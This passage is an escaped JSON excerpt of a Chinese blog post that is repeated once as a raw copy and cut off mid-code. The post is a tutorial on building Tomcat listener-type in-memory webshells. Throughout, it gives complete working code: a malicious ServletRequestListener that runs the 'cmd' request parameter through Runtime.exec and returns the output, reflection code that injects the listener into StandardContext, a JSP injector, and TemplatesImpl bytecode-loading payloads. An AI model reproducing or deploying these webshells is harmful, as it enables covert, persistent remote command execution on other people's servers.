类型的参数，也就是servlet请求事件。那么就需要想办法从这个 `ServletRequestEvent` 对象中来获取 `request` 对象。\n\n\n\n可以看到该对象有一个 `getServletRequest` 方法，看起来就跟 `request` 对象有关\n\n\n\n\n\n可以看到返回了一个 `ServletRequest` 接口的实现类的对象，测试一下看看具体返回的哪个类的对象\n\n\n\n可以看到是 `org.apache.catalina.connector.RequestFacade` 的对象，看看他有哪些属性\n\n\n\n发现其有 `request` 属性是 `Request` 类型的，那么我们就可以通过反射来获取该属性的值\n\n开始构造恶意 `Listener`\n\n```auto\nimport org.apache.catalina.connector.Request;\nimport org.apache.catalina.connector.RequestFacade;\nimport org.apache.catalina.connector.Response;\n\nimport javax.servlet.Filter;\nimport javax.servlet.ServletRequest;\nimport javax.servlet.ServletRequestEvent;\nimport javax.servlet.ServletRequestListener;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.lang.reflect.Field;\n\npublic class Testlistener implements ServletRequestListener {\n    @Override\n    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {\n\n    }\n\n    @Override\n    public void requestInitialized(ServletRequestEvent servletRequestEvent) {\n        RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();\n        try {\n            Field requestf=test.getClass().getDeclaredField(\"request\");\n            requestf.setAccessible(true);\n            Request request= (Request) requestf.get(test);\n            Response response=request.getResponse();\n\n            String cmd=request.getParameter(\"cmd\");\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c\"+cmd).getInputStream();\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n\n                response.getWriter().write(new String(baos.toByteArray()));\n            }\n        } catch (NoSuchFieldException | IllegalAccessException | IOException e) {\n            e.printStackTrace();\n        }\n\n    }\n}\n```\n\n\n\n成功\n\n### 实现动态注册Listener\n\n现在来理一下 `Listener` 的注册流程\n\n\n\n先下两个断点，第一个断点是为了查看什么时候进行的实例化，第二个断点是要知道什么时候调用的该方法。\n\n\n\n在 `StandardContext$listenerStart`进行实例化，我们跟踪一下 `listeners` 的来源\n\n\n\n`listeners` 是一个 `String` 类型的数组，存储了 `listener` 的名字,通过 `findApplicationListeners` 方法获取值\n\n\n\n`results` 数组用来存储已经实例化的 `listener` 对象，然后继续看\n\n\n\n将 `results` 中的 `listener` 分类存放，我们的 `TestListener` 就被分到了 `eventListeners` 中\n\n\n\n然后调用 `getApplicationEventListeners` 获取 `applicationEventListenersList` ，就是已注册的 `applicationEventListener` ，并将其添加到我们的 `eventListeners` 中。之后再调用 `setApplicationEventListeners` 将`eventListeners` 设置为`ApplicationEventListeners` 。刚看到时我在想，为什么要将已有的`applicationEventListener` 取出来，然后再 `set` 呢，这不会重复吗，随后跟进一下 `setApplicationEventListeners` 方法的源码就知道了\n\n```auto\npublic void setApplicationEventListeners(Object[] listeners) {\n        this.applicationEventListenersList.clear();\n        if (listeners != null && listeners.length > 0) {\n            this.applicationEventListenersList.addAll(Arrays.asList(listeners));\n        }\n\n    }\n```\n\n该方法首先会清空 `applicationEventListenersList` ，然后再进行添加。\n\n\n\n然后 `instance` 这个数组就会获取所有已注册的 `lsitener` ，且是已实例化的 `listener` ，然后就是一些其他的处理了，这里不再关注。\n\n继续看第二个断点\n\n\n\n可以看到对 `requestInitialized` 方法的调用是在 `StandardContext$fireRequestInitEvent` 中进行的，这个 `listener` 是从 `instances` 数组中得到的，而`instances` 又是调用`getApplicationEventListeners` 方法获取的\n\n\n\n那么其实我们如果将恶意 `listener` 添加到这个 list中就可以了，就像这样\n\n```auto\nObject[] objects = standardContext.getApplicationEventListeners();\nList<Object> listeners = Arrays.asList(objects);\nList<Object> listenerList = new ArrayList(listeners);\nlistenerList.add(new Testlistener());\nstandardContext.setApplicationEventListeners(listenerList.toArray());\n```\n\n### JSP实现内存马注入\n\n先使用 `JSP` 实现内存马的注入\n\n```auto\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.util.List\" %>\n<%@ page import=\"java.util.Arrays\" %>\n<%@ page import=\"java.util.ArrayList\" %>\n<%@ page import=\"org.apache.catalina.connector.RequestFacade\" %>\n<%@ page import=\"org.apache.catalina.connector.Request\" %>\n<%@ page import=\"org.apache.catalina.connector.Response\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Testlistener implements ServletRequestListener {\n        @Override\n        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {\n\n        }\n\n        @Override\n        public void requestInitialized(ServletRequestEvent servletRequestEvent) {\n            RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();\n            try {\n                Field requestf=test.getClass().getDeclaredField(\"request\");\n                requestf.setAccessible(true);\n                Request request= (Request) requestf.get(test);\n                Response response=request.getResponse();\n\n                String cmd=request.getParameter(\"cmd\");\n                System.out.println(cmd);\n                if(cmd!=null){\n                    InputStream in = Runtime.getRuntime().exec(\"cmd /c\"+cmd).getInputStream();\n                    ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                    byte[] b = new byte[1024];\n                    int a = -1;\n\n                    while ((a = in.read(b)) != -1) {\n                        baos.write(b, 0, a);\n                    }\n\n                    response.getWriter().write(new String(baos.toByteArray()));\n                }\n            } catch (NoSuchFieldException | IllegalAccessException | IOException e) {\n                e.printStackTrace();\n            }\n\n        }\n    }\n%>\n\n<%\n    //获取StandardContext\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n    \n    //注入listener\n    Object[] objects = standardContext.getApplicationEventListeners();\n    List<Object> listeners = Arrays.asList(objects);\n    List<Object> listenerList = new ArrayList(listeners);\n    listenerList.add(new Testlistener());\n    standardContext.setApplicationEventListeners(listenerList.toArray());\n%>\n```\n\n可以执行命令并获取回显\n\n\n\n### 动态加载字节码实现内存马注入\n\n用反序列化有点麻烦，通常我们反序列化注入内存马也是用加载字节码的方式，所以我这里直接加载字节码方便一点，原理一样的。\n\n测试demo\n\n```auto\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.xml.transform.TransformerConfigurationException;\nimport java.io.IOException;\nimport java.lang.reflect.Field;\nimport java.util.Base64;\n\npublic class ListenerShell extends HttpServlet{\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String test=req.getParameter(\"test\");\n        byte[] bytecode= Base64.getDecoder().decode(test);\n        byte[][] bytee= new byte[][]{bytecode};\n        TemplatesImpl templates=new TemplatesImpl();\n        try {\n            setFildValue(templates,\"_bytecodes\",bytee);\n            setFildValue(templates,\"_name\",\"Code\");\n            setFildValue(templates,\"_tfactory\",new TransformerFactoryImpl());\n            templates.newTransformer();\n        } catch (TransformerConfigurationException e) {\n            e.printStackTrace();\n        } catch (NoSuchFieldException e) {\n            e.printStackTrace();\n        } catch (IllegalAccessException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        super.doGet(req, resp);\n    }\n\n    public static void setFildValue(Object obj,String name,Object value) throws NoSuchFieldException, IllegalAccessException {\n        Field field=obj.getClass().getDeclaredField(name);\n        field.setAccessible(true);\n        field.set(obj,value);\n    }\n}\n```\n\n就是利用 `TemplatesImpl` 加载字节码，试一下\n\n\n\n现在来编写POC，这里我们还是用之前学的 `lastServicedRequest` 的方式获取回显，过程还是分为两不\n\n+   将 `request` 和 `response` 对象分别存放进`lastServicedRequest` 和 `lastServicedResponse` 对象\n+   将 `request` 从 `lastServicedRequest`取出，并通过其动态注册恶意 listener\n\n第一步可以直接用之前的代码\n\n```auto\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;\nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\n\nimport java.lang.reflect.Field;\n\npublic class Echoinject extends AbstractTranslet {\n    static {\n        try {\n            //修改WRAP_SAME_OBJECT的值为true\n            Class dispatcher = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\");\n            Field WRAP_SAME_OBJECT = dispatcher.getDeclaredField(\"WRAP_SAME_OBJECT\");\n            WRAP_SAME_OBJECT.setAccessible(true);\n\n            //修改final变量，否则不能修改final的属性\n            Field modifiersField = WRAP_SAME_OBJECT.getClass().getDeclaredField(\"modifiers\");\n            modifiersField.setAccessible(true);\n            modifiersField.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() & ~java.lang.reflect.Modifier.FINAL);\n            if (!WRAP_SAME_OBJECT.getBoolean(null)) {\n                WRAP_SAME_OBJECT.setBoolean(null, true);\n            }\n\n            //初始化lastServicedRequest\n            Class filterchain = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\");\n            Field lastServicedRequest = filterchain.getDeclaredField(\"lastServicedRequest\");\n            modifiersField = lastServicedRequest.getClass().getDeclaredField(\"modifiers\");\n            modifiersField.setAccessible(true);\n            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() & ~java.lang.reflect.Modifier.FINAL);\n            lastServicedRequest.setAccessible(true);\n            if (lastServicedRequest.get(null) == null) {\n                lastServicedRequest.set(null, new ThreadLocal());\n            }\n\n            //初始化初始化lastServicedResponse\n            Field lastServicedResponse = filterchain.getDeclaredField(\"lastServicedResponse\");\n            modifiersField = lastServicedResponse.getClass().getDeclaredField(\"modifiers\");\n            modifiersField.setAccessible(true);\n            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() & ~java.lang.reflect.Modifier.FINAL);\n            lastServicedResponse.setAccessible(true);\n            if (lastServicedResponse.get(null) == null) {\n                lastServicedResponse.set(null, new ThreadLocal());\n            }\n        } catch (NoSuchFieldException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IllegalAccessException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n\n    }\n\n    @Override\n    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\n\n    }\n}\n```\n\n写一下第二步的代码\n\n```auto\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;\nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\nimport org.apache.catalina.connector.Request;\nimport org.apache.catalina.connector.RequestFacade;\nimport org.apache.catalina.connector.Response;\nimport org.apache.catalina.core.ApplicationContext;\nimport org.apache.catalina.core.StandardContext;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport javax.servlet.ServletContext;\nimport javax.servlet.ServletRequest;\nimport javax.servlet.ServletRequestEvent;\nimport javax.servlet.ServletRequestListener;\nimport java.lang.reflect.Field;\nimport java.util.List;\n\npublic class ListenerInject extends AbstractTranslet implements ServletRequestListener {\n    static {\n        //获取request和response\n        try {\n            Field context= null;\n            context = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\").getDeclaredField(\"lastServicedRequest\");\n            context.setAccessible(true);\n            ThreadLocal threadLocal=(ThreadLocal) context.get(null);\n            ServletRequest request=null;\n            if(threadLocal!=null&&threadLocal.get()!=null){\n                request= (ServletRequest) threadLocal.get();\n            }\n\n            if(request!=null){\n                //获取context\n                ServletContext servletContext=request.getServletContext();\n                if(servletContext!=null){\n                    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n                    appctx.setAccessible(true);\n                    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n                    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n                    stdctx.setAccessible(true);\n                    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n                    //注入listener\n                    Object[] objects = standardContext.getApplicationEventListeners();\n                    List<Object> listeners = Arrays.asList(objects);\n                    List<Object> listenerList = new ArrayList(listeners);\n                    listenerList.add(new ListenerInject());\n                    standardContext.setApplicationEventListeners(listenerList.toArray());\n                }\n            }\n        } catch (NoSuchFieldException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IllegalAccessException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n\n    }\n\n    @Override\n    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\n\n    }\n\n    @Override\n    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {\n\n    }\n\n    @Override\n    public void requestInitialized(ServletRequestEvent servletRequestEvent) {\n        RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();\n        try {\n            Field requestf=test.getClass().getDeclaredField(\"request\");\n            requestf.setAccessible(true);\n            Request request= (Request) requestf.get(test);\n            Response response=request.getResponse();\n\n            String cmd=request.getParameter(\"cmd\");\n            System.out.println(cmd);\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c\"+cmd).getInputStream();\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n\n                response.getWriter().write(new String(baos.toByteArray()));\n            }\n        } catch (NoSuchFieldException | IllegalAccessException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n\n\n成功注入，over\n\n### 另一种动态注入listener的方式\n\n我发现有一个`addApplicationEventListener` 方法，可以直接将对象插进去\n\n\n\n```auto\nstandardContext.addApplicationEventListener(new Testlistener());\n```\n\n所以我们的jsp马就可以简化成\n\n```auto\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.util.List\" %>\n<%@ page import=\"java.util.Arrays\" %>\n<%@ page import=\"java.util.ArrayList\" %>\n<%@ page import=\"org.apache.catalina.connector.RequestFacade\" %>\n<%@ page import=\"org.apache.catalina.connector.Request\" %>\n<%@ page import=\"org.apache.catalina.connector.Response\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Testlistener implements ServletRequestListener {\n        @Override\n        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {\n\n        }\n\n        @Override\n        public void requestInitialized(ServletRequestEvent servletRequestEvent) {\n            RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();\n            try {\n                Field requestf=test.getClass().getDeclaredField(\"request\");\n                requestf.setAccessible(true);\n                Request request= (Request) requestf.get(test);\n                Response response=request.getResponse();\n\n                String cmd=request.getParameter(\"cmd\");\n                System.out.println(cmd);\n                if(cmd!=null){\n                    InputStream in = Runtime.getRuntime().exec(\"cmd /c\"+cmd).getInputStream();\n                    ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                    byte[] b = new byte[1024];\n                    int a = -1;\n\n                    while ((a = in.read(b)) != -1) {\n                        baos.write(b, 0, a);\n                    }\n\n                    response.getWriter().write(new String(baos.toByteArray()));\n                }\n            } catch (NoSuchFieldException | IllegalAccessException | IOException e) {\n                e.printStackTrace();\n            }\n\n        }\n    }\n%>\n\n<%\n    //获取StandardContext\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    //注入listener\n    standardContext.addApplicationEventListener(new Testlistener());\n%>\n```\n\n","source":"_posts/Tomcat内存马—Listener型.md","raw":"---\ntitle: Tomcat内存马—Listener型\ndate: 2023-06-14 22:10:33\nexcerpt: Tomcat内存马—Listener型\ncategories: 学习\n---\n\n\n\n## 前言\n\n之前学了 filter 型的内存马，现在继续学习 listener 型\n\n## 正文\n\n前面的 `filter` 内存马是通过动态注册恶意的 `filter` 来实现一个 `webshell` ，这个 `listener` 内存马原理其实也差不多，就是动态注册一个恶意的 `listener` 。\n\n### 构造恶意Listener\n\n这个恶意的 `Listener` 要实现一个webshell的功能，就需要获取到 `request` 对象，现在来看一下怎么构造出这个恶意 `Listener`\n\n\n\n`requestInitialized` 方法只有一个`ServletRequestEvent` 类型的参数，也就是servlet请求事件。那么就需要想办法从这个 `ServletRequestEvent` 对象中来获取 `request` 对象。\n\n\n\n可以看到该对象有一个 `getServletRequest` 方法，看起来就跟 `request` 对象有关\n\n\n\n\n\n可以看到返回了一个 `ServletRequest` 接口的实现类的对象，测试一下看看具体返回的哪个类的对象\n\n\n\n可以看到是 `org.apache.catalina.connector.RequestFacade` 的对象，看看他有哪些属性\n\n\n\n发现其有 `request` 属性是 `Request` 类型的，那么我们就可以通过反射来获取该属性的值\n\n开始构造恶意 `Listener`\n\n```auto\nimport org.apache.catalina.connector.Request;\nimport org.apache.catalina.connector.RequestFacade;\nimport org.apache.catalina.connector.Response;\n\nimport javax.servlet.Filter;\nimport javax.servlet.ServletRequest;\nimport javax.servlet.ServletRequestEvent;\nimport javax.servlet.ServletRequestListener;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.lang.reflect.Field;\n\npublic class Testlistener implements ServletRequestListener {\n    @Override\n    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {\n\n    }\n\n    @Override\n    public void requestInitialized(ServletRequestEvent servletRequestEvent) {\n        RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();\n        try {\n            Field requestf=test.getClass().getDeclaredField(\"request\");\n            requestf.setAccessible(true);\n            Request request= (Request) requestf.get(test);\n            Response response=request.getResponse();\n\n            String cmd=request.getParameter(\"cmd\");\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c\"+cmd).getInputStream();\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n\n                response.getWriter().write(new String(baos.toByteArray()));\n            }\n        } catch (NoSuchFieldException | IllegalAccessException | IOException e) {\n            e.printStackTrace();\n        }\n\n    }\n}\n```\n\n\n\n成功\n\n### 实现动态注册Listener\n\n现在来理一下 `Listener` 的注册流程\n\n\n\n先下两个断点，第一个断点是为了查看什么时候进行的实例化，第二个断点是要知道什么时候调用的该方法。\n\n\n\n在 `StandardContext$listenerStart`进行实例化，我们跟踪一下 `listeners` 的来源\n\n\n\n`listeners` 是一个 `String` 类型的数组，存储了 `listener` 的名字,通过 `findApplicationListeners` 方法获取值\n\n\n\n`results` 数组用来存储已经实例化的 `listener` 对象，然后继续看\n\n\n\n将 `results` 中的 `listener` 分类存放，我们的 `TestListener` 就被分到了 `eventListeners` 中\n\n\n\n然后调用 `getApplicationEventListeners` 获取 `applicationEventListenersList` ，就是已注册的 `applicationEventListener` ，并将其添加到我们的 `eventListeners` 中。之后再调用 `setApplicationEventListeners` 将`eventListeners` 设置为`ApplicationEventListeners` 。刚看到时我在想，为什么要将已有的`applicationEventListener` 取出来，然后再 `set` 呢，这不会重复吗，随后跟进一下 `setApplicationEventListeners` 方法的源码就知道了\n\n```auto\npublic void setApplicationEventListeners(Object[] listeners) {\n        this.applicationEventListenersList.clear();\n        if (listeners != null && listeners.length > 0) {\n            this.applicationEventListenersList.addAll(Arrays.asList(listeners));\n        }\n\n    }\n```\n\n该方法首先会清空 `applicationEventListenersList` ，然后再进行添加。\n\n\n\n然后 `instance` 这个数组就会获取所有已注册的 `lsitener` ，且是已实例化的 `listener` ，然后就是一些其他的处理了，这里不再关注。\n\n继续看第二个断点\n\n\n\n可以看到对 `requestInitialized` 方法的调用是在 `StandardContext$fireRequestInitEvent` 中进行的，这个 `listener` 是从 `instances` 数组中得到的，而`instances` 又是调用`getApplicationEventListeners` 方法获取的\n\n\n\n那么其实我们如果将恶意 `listener` 添加到这个 list中就可以了，就像这样\n\n```auto\nObject[] objects = standardContext.getApplicationEventListeners();\nList<Object> listeners = Arrays.asList(objects);\nList<Object> listenerList = new ArrayList(listeners);\nlistenerList.add(new Testlistener());\nstandardContext.setApplicationEventListeners(listenerList.toArray());\n```\n\n### JSP实现内存马注入\n\n先使用 `JSP` 实现内存马的注入\n\n```auto\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.util.List\" %>\n<%@ page import=\"java.util.Arrays\" %>\n<%@ page import=\"java.util.ArrayList\" %>\n<%@ page import=\"org.apache.catalina.connector.RequestFacade\" %>\n<%@ page import=\"org.apache.catalina.connector.Request\" %>\n<%@ page import=\"org.apache.catalina.connector.Response\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Testlistener implements ServletRequestListener {\n        @Override\n        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {\n\n        }\n\n        @Override\n        public void requestInitialized(ServletRequestEvent servletRequestEvent) {\n            RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();\n            try {\n                Field requestf=test.getClass().getDeclaredField(\"request\");\n                requestf.setAccessible(true);\n                Request request= (Request) requestf.get(test);\n                Response response=request.getResponse();\n\n                String cmd=request.getParameter(\"cmd\");\n                System.out.println(cmd);\n                if(cmd!=null){\n                    InputStream in = Runtime.getRuntime().exec(\"cmd /c\"+cmd).getInputStream();\n                    ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                    byte[] b = new byte[1024];\n                    int a = -1;\n\n                    while ((a = in.read(b)) != -1) {\n                        baos.write(b, 0, a);\n                    }\n\n                    response.getWriter().write(new String(baos.toByteArray()));\n                }\n            } catch (NoSuchFieldException | IllegalAccessException | IOException e) {\n                e.printStackTrace();\n            }\n\n        }\n    }\n%>\n\n<%\n    //获取StandardContext\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n    \n    //注入listener\n    Object[] objects = standardContext.getApplicationEventListeners();\n    List<Object> listeners = Arrays.asList(objects);\n    List<Object> listenerList = new ArrayList(listeners);\n    listenerList.add(new Testlistener());\n    standardContext.setApplicationEventListeners(listenerList.toArray());\n%>\n```\n\n可以执行命令并获取回显\n\n\n\n### 动态加载字节码实现内存马注入\n\n用反序列化有点麻烦，通常我们反序列化注入内存马也是用加载字节码的方式，所以我这里直接加载字节码方便一点，原理一样的。\n\n测试demo\n\n```auto\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.xml.transform.TransformerConfigurationException;\nimport java.io.IOException;\nimport java.lang.reflect.Field;\nimport java.util.Base64;\n\npublic class ListenerShell extends HttpServlet{\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String test=req.getParameter(\"test\");\n        byte[] bytecode= Base64.getDecoder().decode(test);\n        byte[][] bytee= new byte[][]{bytecode};\n        TemplatesImpl templates=new TemplatesImpl();\n        try {\n            setFildValue(templates,\"_bytecodes\",bytee);\n            setFildValue(templates,\"_name\",\"Code\");\n            setFildValue(templates,\"_tfactory\",new TransformerFactoryImpl());\n            templates.newTransformer();\n        } catch (TransformerConfigurationException e) {\n            e.printStackTrace();\n        } catch (NoSuchFieldException e) {\n            e.printStackTrace();\n        } catch (IllegalAccessException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        super.doGet(req, resp);\n    }\n\n    public static void setFildValue(Object obj,String name,Object value) throws NoSuchFieldException, IllegalAccessException {\n        Field field=obj.getClass().getDeclaredField(name);\n        field.setAccessible(true);\n        field.set(obj,value);\n    }\n}\n```\n\n就是利用 `TemplatesImpl` 加载字节码，试一下\n\n\n\n现在来编写POC，这里我们还是用之前学的 `lastServicedRequest` 的方式获取回显，过程还是分为两不\n\n+   将 `request` 和 `response` 对象分别存放进`lastServicedRequest` 和 `lastServicedResponse` 对象\n+   将 `request` 从 `lastServicedRequest`取出，并通过其动态注册恶意 listener\n\n第一步可以直接用之前的代码\n\n```auto\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;\nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\n\nimport java.lang.reflect.Field;\n\npublic class Echoinject extends AbstractTranslet {\n    static {\n        try {\n            //修改WRAP_SAME_OBJECT的值为true\n            Class dispatcher = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\");\n            Field WRAP_SAME_OBJECT = dispatcher.getDeclaredField(\"WRAP_SAME_OBJECT\");\n            WRAP_SAME_OBJECT.setAccessible(true);\n\n            //修改final变量，否则不能修改final的属性\n            Field modifiersField = WRAP_SAME_OBJECT.getClass().getDeclaredField(\"modifiers\");\n            modifiersField.setAccessible(true);\n            modifiersField.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() & ~java.lang.reflect.Modifier.FINAL);\n            if (!WRAP_SAME_OBJECT.getBoolean(null)) {\n                WRAP_SAME_OBJECT.setBoolean(null, true);\n            }\n\n            //初始化lastServicedRequest\n            Class filterchain = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\");\n            Field lastServicedRequest = filterchain.getDeclaredField(\"lastServicedRequest\");\n            modifiersField = lastServicedRequest.getClass().getDeclaredField(\"modifiers\");\n            modifiersField.setAccessible(true);\n            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() & ~java.lang.reflect.Modifier.FINAL);\n            lastServicedRequest.setAccessible(true);\n            if (lastServicedRequest.get(null) == null) {\n                lastServicedRequest.set(null, new ThreadLocal());\n            }\n\n            //初始化初始化lastServicedResponse\n            Field lastServicedResponse = filterchain.getDeclaredField(\"lastServicedResponse\");\n            modifiersField = lastServicedResponse.getClass().getDeclaredField(\"modifiers\");\n            modifiersField.setAccessible(true);\n            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() & ~java.lang.reflect.Modifier.FINAL);\n            lastServicedResponse.setAccessible(true);\n            if (lastServicedResponse.get(null) == null) {\n                lastServicedResponse.set(null, new ThreadLocal());\n            }\n        } catch (NoSuchFieldException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IllegalAccessException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n\n    }\n\n    @Override\n    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\n\n    }\n}\n```\n\n写一下第二步的代码\n\n```auto\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;\nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\nimport org.apache.catalina.connector.Request;\nimport org.apache.catalina.connector.RequestFacade;\nimport org.apache.catalina.connector.Response;\nimport org.apache.catalina.core.ApplicationContext;\nimport org.apache.catalina.core.StandardContext;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.ArrayList;\nimport 